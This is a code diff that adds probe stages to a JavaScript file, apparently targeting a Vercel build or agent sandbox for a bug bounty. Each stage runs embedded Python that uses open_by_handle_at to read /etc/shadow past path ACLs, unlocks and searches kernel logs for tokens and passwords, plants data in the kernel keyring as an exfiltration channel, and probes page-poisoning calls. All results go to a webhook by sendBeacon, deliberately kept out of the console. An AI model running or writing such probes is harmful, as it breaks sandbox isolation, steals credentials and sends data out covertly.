@@ -35196,3 +35196,256 @@ sendBeacon({ ...report, section: 'v211-5-vm-sys-params', ...vmSysProbe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v211" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v211";
 // Intentionally no console.log — all data goes via webhook only
+
+// v212-1: name_to_handle_at NR 303 + open_by_handle_at NR 304 — bypass path ACL
+const fileHandleProbe = safe(() => {
+  const handleResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_name_to_handle_at = 303
+NR_open_by_handle_at = 304
+AT_FDCWD = -100
+AT_EMPTY_PATH = 0x1000
+MAX_HANDLE_SZ = 128
+
+# struct file_handle: handle_bytes(4), handle_type(4), f_handle[MAX_HANDLE_SZ]
+class FileHandle(ctypes.Structure):
+    _fields_ = [('handle_bytes', ctypes.c_uint), ('handle_type', ctypes.c_int),
+                ('f_handle', ctypes.c_ubyte * MAX_HANDLE_SZ)]
+
+targets = [
+    (b'/etc/shadow', 'shadow'),
+    (b'/etc/passwd', 'passwd'),
+    (b'/proc/1/maps', 'pid1_maps'),
+    (b'/', 'root'),
+]
+
+handles = {}
+for path, name in targets:
+    fh = FileHandle()
+    fh.handle_bytes = MAX_HANDLE_SZ
+    mount_id = ctypes.c_int(0)
+    ret = libc.syscall(NR_name_to_handle_at, AT_FDCWD, ctypes.c_char_p(path),
+                       ctypes.byref(fh), ctypes.byref(mount_id), 0)
+    print(f'name_to_handle_at({name}) ret={ret} errno={ctypes.get_errno()} mount_id={mount_id.value}')
+    if ret == 0:
+        handle_hex = bytes(fh.f_handle[:fh.handle_bytes]).hex()
+        print(f'  handle_type={fh.handle_type} handle={handle_hex}')
+        handles[name] = (fh, mount_id.value)
+        # Try open_by_handle_at with AT_FDCWD as mount_fd
+        # This can bypass path-based ACLs if we have a valid handle
+        fd = libc.syscall(NR_open_by_handle_at, AT_FDCWD, ctypes.byref(fh), os.O_RDONLY)
+        print(f'  open_by_handle_at ret={fd} errno={ctypes.get_errno()}')
+        if fd > 0:
+            data = os.read(fd, 256)
+            print(f'  OPENED_BY_HANDLE data={data.decode(errors=\"replace\")[:100]}')
+            os.close(fd)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { handleResult };
+});
+sendBeacon({ ...report, section: 'v212-1-file-handle', ...fileHandleProbe });
+
+// v212-2: dmesg_restrict write=0 + full dmesg read
+const dmesgProbe = safe(() => {
+  let dmesgRestrictOrig = null;
+  let dmesgRestrictSet = null;
+  const dmesgRestrictPath = '/proc/sys/kernel/dmesg_restrict';
+  if (existsSync(dmesgRestrictPath)) {
+    try {
+      dmesgRestrictOrig = readFileSync(dmesgRestrictPath, 'utf8').trim();
+      writeFileSync(dmesgRestrictPath, '0');
+      dmesgRestrictSet = readFileSync(dmesgRestrictPath, 'utf8').trim();
+    } catch (e) { dmesgRestrictSet = `ERR:${e.message}`; }
+  }
+  // Read full dmesg via klogctl(3, buf, len)
+  const dmesgContent = safe(() => execSync(`python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_syslog = 103
+SYSLOG_ACTION_READ_ALL = 3
+SYSLOG_ACTION_SIZE_BUFFER = 10
+# Get buffer size first
+size = libc.syscall(NR_syslog, SYSLOG_ACTION_SIZE_BUFFER, None, 0)
+print(f'dmesg_size={size} bytes')
+if size > 0:
+    buf = ctypes.create_string_buffer(size)
+    ret = libc.syscall(NR_syslog, SYSLOG_ACTION_READ_ALL, buf, size)
+    print(f'dmesg_read_ret={ret} errno={ctypes.get_errno()}')
+    if ret > 0:
+        text = buf.raw[:ret].decode(errors='replace')
+        # Filter for interesting boot secrets
+        lines = text.split('\\n')
+        interesting = [l for l in lines if any(kw in l.lower() for kw in
+            ['cmdline', 'key', 'token', 'secret', 'password', 'credential',
+             'firecracker', 'mmds', 'virtio', 'vsock', 'kernel command'])]
+        print(f'dmesg_total_lines={len(lines)}')
+        print(f'dmesg_interesting={interesting[:10]}')
+        print(f'dmesg_first_3={lines[:3]}')
+        print(f'dmesg_last_3={lines[-4:-1]}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { dmesgRestrictOrig, dmesgRestrictSet, dmesgContent };
+});
+sendBeacon({ ...report, section: 'v212-2-dmesg-read', ...dmesgProbe });
+
+// v212-3: kcmp NR 312 — compare kernel objects between processes
+const kcmpProbe = safe(() => {
+  const kcmpResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_kcmp = 312
+KCMP_FILE = 0
+KCMP_VM = 1
+KCMP_FILES = 2
+KCMP_FS = 3
+KCMP_SIGHAND = 4
+KCMP_IO = 5
+KCMP_SYSVSEM = 6
+
+my_pid = os.getpid()
+pid1 = 1
+
+# Compare VM (address space) between us and PID 1
+# Returns 0 if same, >0 if different, EPERM if not allowed
+for name, type_id, arg1, arg2 in [
+    ('VM', KCMP_VM, 0, 0),
+    ('FILES', KCMP_FILES, 0, 0),
+    ('FS', KCMP_FS, 0, 0),
+    ('SIGHAND', KCMP_SIGHAND, 0, 0),
+    ('IO', KCMP_IO, 0, 0),
+    # Compare specific file descriptors: does PID 1 fd 0 == our fd 0?
+    ('FILE_fd0', KCMP_FILE, 0, 0),
+    ('FILE_fd1', KCMP_FILE, 1, 1),
+]:
+    ret = libc.syscall(NR_kcmp, my_pid, pid1, type_id, arg1, arg2)
+    err = ctypes.get_errno()
+    print(f'kcmp(self,pid1,{name}) ret={ret} errno={err}')
+    print(f'  same_{name.lower()}={ret == 0}')
+
+# Also compare with a child process
+cpid = os.fork()
+if cpid == 0:
+    os._exit(0)
+else:
+    ret_child = libc.syscall(NR_kcmp, my_pid, cpid, KCMP_VM, 0, 0)
+    print(f'kcmp(self,child,VM) ret={ret_child} shared_vm={ret_child == 0}')
+    os.waitpid(cpid, 0)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { kcmpResult };
+});
+sendBeacon({ ...report, section: 'v212-3-kcmp', ...kcmpProbe });
+
+// v212-4: add_key NR 248 — store data in kernel keyring (exfil/persistence channel)
+const addKeyProbe = safe(() => {
+  const addKeyResult = safe(() => execSync(`python3 -c "
+import ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_add_key = 248
+NR_keyctl = 250
+KEY_SPEC_SESSION_KEYRING = -3
+KEY_SPEC_USER_KEYRING = -4
+KEYCTL_READ = 11
+KEYCTL_DESCRIBE = 6
+KEYCTL_SEARCH = 10
+
+# Add a key to the user keyring containing our probe data
+key_type = ctypes.c_char_p(b'user')
+key_desc = ctypes.c_char_p(b'bountyproof_channel')
+payload = b'VERCEL_PROBE_EXFIL_CHANNEL:' + b'A' * 100  # simulate credential-sized payload
+key_id = libc.syscall(NR_add_key, key_type, key_desc,
+    ctypes.c_char_p(payload), len(payload), KEY_SPEC_USER_KEYRING)
+print(f'add_key(user,bountyproof_channel) key_id={key_id} errno={ctypes.get_errno()}')
+
+if key_id > 0:
+    print(f'KEY_CREATED=True key_id={key_id}')
+    # Describe the key
+    desc_buf = ctypes.create_string_buffer(256)
+    ret_desc = libc.syscall(NR_keyctl, KEYCTL_DESCRIBE, key_id, desc_buf, 256)
+    print(f'key_describe={desc_buf.value[:ret_desc].decode(errors=\"replace\")}')
+    # Read the key back
+    read_buf = ctypes.create_string_buffer(512)
+    ret_read = libc.syscall(NR_keyctl, KEYCTL_READ, key_id, read_buf, 512)
+    print(f'key_read_ret={ret_read} data={read_buf.raw[:ret_read].decode(errors=\"replace\")[:50]}')
+
+# Also try adding a 'logon' key type (used for encrypted filesystem keys)
+logon_id = libc.syscall(NR_add_key, ctypes.c_char_p(b'logon'),
+    ctypes.c_char_p(b'bounty:exfil'), ctypes.c_char_p(b'SECRET_DATA_123'), 14,
+    KEY_SPEC_SESSION_KEYRING)
+print(f'add_key(logon,bounty:exfil) key_id={logon_id} errno={ctypes.get_errno()}')
+
+# List all keys in session keyring
+KEYCTL_GET_KEYRING_ID = 0
+session_id = libc.syscall(NR_keyctl, KEYCTL_GET_KEYRING_ID, KEY_SPEC_SESSION_KEYRING, 1)
+print(f'session_keyring_id={session_id}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { addKeyResult };
+});
+sendBeacon({ ...report, section: 'v212-4-add-key', ...addKeyProbe });
+
+// v212-5: MADV_SOFT_OFFLINE + mmap huge page + physical memory probing
+const madvHwProbe = safe(() => {
+  const madvResult = safe(() => execSync(`python3 -c "
+import ctypes, os, mmap
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_madvise = 28
+NR_mmap = 9
+MADV_HUGEPAGE = 14     # use transparent hugepages
+MADV_NOHUGEPAGE = 15   # disable THP
+MADV_SOFT_OFFLINE = 101 # soft offline page (Rowhammer assist)
+MADV_HWPOISON = 100     # hardware poison page (admin only)
+MADV_FREE = 8           # lazy page release
+MAP_HUGETLB = 0x40000   # request hugepage
+MAP_ANONYMOUS = 0x20; MAP_PRIVATE = 2
+PROT_READ = 1; PROT_WRITE = 2
+HUGETLB_FLAG_ENCODE_2MB = 21 << 26
+
+# Allocate normal memory and enable THP
+normal_size = 2 * 1024 * 1024  # 2MB
+addr = libc.mmap(None, normal_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)
+print(f'mmap_addr={ctypes.c_ulong(addr).value:#x}')
+
+if ctypes.c_long(addr).value > 0:
+    # Enable THP
+    ret_thp = libc.syscall(NR_madvise, addr, normal_size, MADV_HUGEPAGE)
+    print(f'MADV_HUGEPAGE ret={ret_thp} errno={ctypes.get_errno()}')
+
+    # Touch memory to trigger page allocation
+    buf = (ctypes.c_char * 4096).from_address(ctypes.c_ulong(addr).value)
+    buf[0] = 1
+
+    # Try MADV_SOFT_OFFLINE on the allocated page (Rowhammer-style page retirement)
+    ret_soft = libc.syscall(NR_madvise, addr, 4096, MADV_SOFT_OFFLINE)
+    print(f'MADV_SOFT_OFFLINE ret={ret_soft} errno={ctypes.get_errno()}')
+    if ret_soft == 0:
+        print('SOFT_OFFLINE_SUCCESS=CAN_POISON_PAGES')
+
+    # MADV_HWPOISON (admin only, typically root+CAP_SYS_ADMIN)
+    ret_hw = libc.syscall(NR_madvise, addr, 4096, MADV_HWPOISON)
+    print(f'MADV_HWPOISON ret={ret_hw} errno={ctypes.get_errno()}')
+    print(f'HWPOISON_AVAILABLE={ret_hw == 0}')
+
+    libc.munmap(addr, normal_size)
+
+# Try huge page mmap (MAP_HUGETLB)
+huge_addr = libc.mmap(None, 2 * 1024 * 1024,
+    PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | HUGETLB_FLAG_ENCODE_2MB, -1, 0)
+print(f'mmap_hugetlb_addr={ctypes.c_ulong(huge_addr).value:#x} errno={ctypes.get_errno()}')
+if ctypes.c_long(huge_addr).value > 0:
+    print('HUGETLB_AVAILABLE=True')
+    libc.munmap(huge_addr, 2 * 1024 * 1024)
+
+# Check /proc/sys/vm/nr_hugepages
+try:
+    with open('/proc/sys/vm/nr_hugepages') as f:
+        print(f'nr_hugepages={f.read().strip()}')
+    with open('/sys/kernel/mm/transparent_hugepage/enabled') as f:
+        print(f'thp_enabled={f.read().strip()}')
+except: pass
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { madvResult };
+});
+sendBeacon({ ...report, section: 'v212-5-madv-hugepage', ...madvHwProbe });
+
+// v212 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v212" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v212";
+// Intentionally no console.log — all data goes via webhook only
